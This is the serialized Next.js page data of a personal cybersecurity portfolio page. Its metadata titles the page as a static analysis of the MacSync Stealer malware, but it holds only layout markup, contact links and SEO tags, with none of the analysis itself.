Alberta\\\"}}\"}}],[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col h-[100dvh] overflow-hidden\",\"children\":[[\"$\",\"nav\",null,{\"className\":\"p-3 md:p-3 border-b border-gray-200 dark:border-gray-800 shrink-0 bg-white dark:bg-black z-50\",\"children\":[\"$\",\"div\",null,{\"className\":\"max-w-7xl mx-auto flex items-center justify-between gap-4\",\"children\":[[\"$\",\"$L3\",null,{}],[\"$\",\"$L4\",null,{}]]}]}],[\"$\",\"main\",null,{\"className\":\"flex-grow overflow-y-auto\",\"children\":[\"$\",\"$L5\",null,{\"className\":\"min-h-full\",\"children\":[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}],[\"$\",\"footer\",null,{\"className\":\"w-full border-t border-gray-200 dark:border-gray-800 py-3 shrink-0 bg-white dark:bg-black z-50\",\"children\":[\"$\",\"div\",null,{\"className\":\"max-w-7xl mx-auto flex flex-col items-center justify-center gap-4\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center gap-6\",\"children\":[[\"$\",\"a\",null,{\"href\":\"https://github.com/KelvinCreighton/\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"className\":\"text-gray-600 hover:text-black dark:text-gray-400 dark:hover:text-white transition-colors\",\"aria-label\":\"GitHub\",\"children\":[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"none\",\"strokeWidth\":\"2\",\"viewBox\":\"0 0 24 24\",\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"height\":\"24\",\"width\":\"24\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[\"$\",\"path\",null,{\"d\":\"M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22\"}]}]}],[\"$\",\"a\",null,{\"href\":\"https://www.linkedin.com/in/kelvin-creighton-250806263\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"className\":\"text-gray-600 hover:text-blue-600 dark:text-gray-400 dark:hover:text-blue-400 transition-colors\",\"aria-label\":\"LinkedIn\",\"children\":\"$L8\"}],\"$L9\"]}]}]}]]}]}]]}]}]]}],{\"children\":[\"$La\",{\"children\":[\"$Lb\",{\"children\":[\"$Lc\",{\"children\":[\"$Ld\",{},null,false,false]},null,false,false]},null,false,false]},null,false,false]},null,false,false],\"$Le\",false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:I[1304,[],\"ClientPageRoot\"]\n11:I[9951,[\"8500\",\"static/chunks/8500-41fa79ac743d83f1.js\",\"7746\",\"static/chunks/7746-0cf5c92c775322e1.js\",\"6831\",\"static/chunks/app/projects/cybersecurity/macsync-stealer/page-93c34dab68825f87.js\"],\"default\"]\n14:I[484,[],\"OutletBoundary\"]\n15:\"$Sreact.suspense\"\n17:I[484,[],\"ViewportBoundary\"]\n19:I[484,[],\"MetadataBoundary\"]\n8:[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"none\",\"strokeWidth\":\"2\",\"viewBox\":\"0 0 24 24\",\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"height\":\"24\",\"width\":\"24\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z\"}],[\"$\",\"rect\",null,{\"x\":\"2\",\"y\":\"9\",\"width\":\"4\",\"height\":\"12\"}],[\"$\",\"circle\",null,{\"cx\":\"4\",\"cy\":\"4\",\"r\":\"2\"}]]}]\n9:[\"$\",\"a\",null,{\"href\":\"mailto:kcreight@ualberta.ca\",\"className\":\"text-gray-600 hover:text-red-600 dark:text-gray-400 dark:hover:text-red-400 transition-colors\",\"aria-label\":\"Email\",\"children\":[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"none\",\"strokeWidth\":\"2\",\"viewBox\":\"0 0 24 24\",\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"height\":\"24\",\"width\":\"24\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z\"}],[\"$\",\"polyline\",null,{\"points\":\"22,6 12,13 2,6\"}]]}]}]\na:[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}]\nb:[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}]\nc:[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}]\nd:[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"$L10\",null,{\"Component\":\"$11\",\"serverProvidedParams\":{\"searchParams\":{},\"params\":{},\"promises\":[\"$@12\",\"$@13\"]}}],null,[\"$\",\"$L14\",null,{\"children\":[\"$\",\"$15\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@16\"}]}]]}]\ne:[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$L17\",null,{\"children\":\"$L18\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$L19\",null,{\"children\":[\"$\",\"$15\",null,{\"name\":\"Next.Metadata\",\"children\":\"$L1a\"}]}]}],null]}]\n"])</script><script>self.__next_f.push([1,"12:{}\n13:\"$d:props:children:0:props:serverProvidedParams:params\"\n"])</script><script>self.__next_f.push([1,"18:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"1b:I[6869,[],\"IconMark\"]\n16:null\n"])</script><script>self.__next_f.push([1,"1a:[[\"$\",\"title\",\"0\",{\"children\":\"MacSync Stealer: Static Malware Analysis\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"A detailed static analysis of the MacSync Stealer malware, uncovering its multi-stage execution flow and C2 communication methods.\"}],[\"$\",\"link\",\"2\",{\"rel\":\"author\",\"href\":\"https://kelvincreighton.ca\"}],[\"$\",\"meta\",\"3\",{\"name\":\"author\",\"content\":\"Kelvin Creighton\"}],[\"$\",\"meta\",\"4\",{\"name\":\"keywords\",\"content\":\"Kelvin Creighton,Cybersecurity,Software Engineering,Computer Science,University of Alberta,Portfolio,CTF,Web Security,Game Development,Automotive Repair\"}],[\"$\",\"meta\",\"5\",{\"name\":\"creator\",\"content\":\"Kelvin Creighton\"}],[\"$\",\"meta\",\"6\",{\"name\":\"publisher\",\"content\":\"Kelvin Creighton\"}],[\"$\",\"meta\",\"7\",{\"name\":\"robots\",\"content\":\"index, follow\"}],[\"$\",\"meta\",\"8\",{\"name\":\"googlebot\",\"content\":\"index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:title\",\"content\":\"Kelvin Creighton | Portfolio\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:description\",\"content\":\"Personal portfolio and blog of Kelvin Creighton, focusing on Cybersecurity, Software Engineering, and Game Development.\"}],[\"$\",\"meta\",\"11\",{\"property\":\"og:url\",\"content\":\"https://kelvincreighton.ca/\"}],[\"$\",\"meta\",\"12\",{\"property\":\"og:site_name\",\"content\":\"Kelvin Creighton's Portfolio\"}],[\"$\",\"meta\",\"13\",{\"property\":\"og:locale\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"14\",{\"property\":\"og:image:type\",\"content\":\"image/png\"}],[\"$\",\"meta\",\"15\",{\"property\":\"og:image:width\",\"content\":\"1200\"}],[\"$\",\"meta\",\"16\",{\"property\":\"og:image:height\",\"content\":\"630\"}],[\"$\",\"meta\",\"17\",{\"property\":\"og:image\",\"content\":\"https://kelvincreighton.ca/opengraph-image.png?fb8fd3e7788c3bab\"}],[\"$\",\"meta\",\"18\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"19\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"20\",{\"name\":\"twitter:title\",\"content\":\"Kelvin Creighton | Portfolio\"}],[\"$\",\"meta\",\"21\",{\"name\":\"twitter:description\",\"content\":\"Cybersecurity \u0026 Software Engineering Portfolio of Kelvin Creighton.\"}],[\"$\",\"meta\",\"22\",{\"name\":\"twitter:image:type\",\"content\":\"image/png\"}],[\"$\",\"meta\",\"23\",{\"name\":\"twitter:image:width\",\"content\":\"1200\"}],[\"$\",\"meta\",\"24\",{\"name\":\"twitter:image:height\",\"content\":\"630\"}],[\"$\",\"meta\",\"25\",{\"name\":\"twitter:image\",\"content\":\"https://kelvincreighton.ca/twitter-image.png?fb8fd3e7788c3bab\"}],[\"$\",\"link\",\"26\",{\"rel\":\"icon\",\"href\":\"/icon.svg?b1a8d6644834f167\",\"type\":\"image/svg+xml\",\"sizes\":\"any\"}],[\"$\",\"$L1b\",\"27\",{}]]\n"])</script></body></html>
